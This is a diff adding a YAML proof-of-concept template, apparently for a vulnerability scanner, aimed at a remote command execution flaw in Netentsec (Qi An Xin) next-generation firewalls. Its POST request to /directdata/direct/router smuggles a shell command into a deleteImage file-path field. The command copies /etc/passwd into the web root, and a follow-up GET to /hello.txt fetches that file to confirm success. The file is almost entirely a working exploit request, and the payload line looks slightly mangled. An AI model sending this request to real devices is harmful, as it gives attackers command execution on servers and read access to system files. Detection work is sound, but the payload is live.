@@ -1,0 +1,43 @@
+app: netentsec
+query: app:"netentsec"
+meta:
+  name: 网康下一代防火墙RCE
+  level: 5
+  tags:
+    - remote_code_execution
+  description: 奇安信网康下一代防火墙存在远程命令执行，通过漏洞攻击者可以获取服务器权限
+  homepage: https://www.netentsec.com/
+  author: 一曲成殇
+  references: https://mp.weixin.qq.com/s?src=11&timestamp=1633845676&ver=3365&signature=*CVADwACdWeiTMe6pXGsvBOwans5zvpBGV-uA3wB7dk561atjUXevuUyBgLByV9sJVflauQyLfsmAhScUuIEhwOddKK8TpHkSU5dhB3*jiIv9g55ZuVlEyrfpwmJyjPD&new=1
+  solution: |-
+    及时更新官网补丁、升级版本。
+    https://www.netentsec.com/
+  steps:
+    verify_steps:
+      type: and
+      verify:
+        - request:
+            method: POST
+            path: /directdata/direct/router
+            redirect: false
+            header: [ ]
+            params: '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat
+z/etc/passwd >/var/www/html/hello.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}'
+          response:
+            - name: code
+              value: "200"
+              type: equals
+            - name: body
+              value: '"action":"SSLVPN_Resource","method":"deleteImage","result":{"success":true}'
+              type: contains
+        - request:
+            method: GET
+            path: /hello.txt
+            redirect: false
+            header: [ ]
+            params: ""
+          response:
+            - name: code
+              value: "200"
+              type: equals
+  create_at: "2021-10-10 14:09:48"
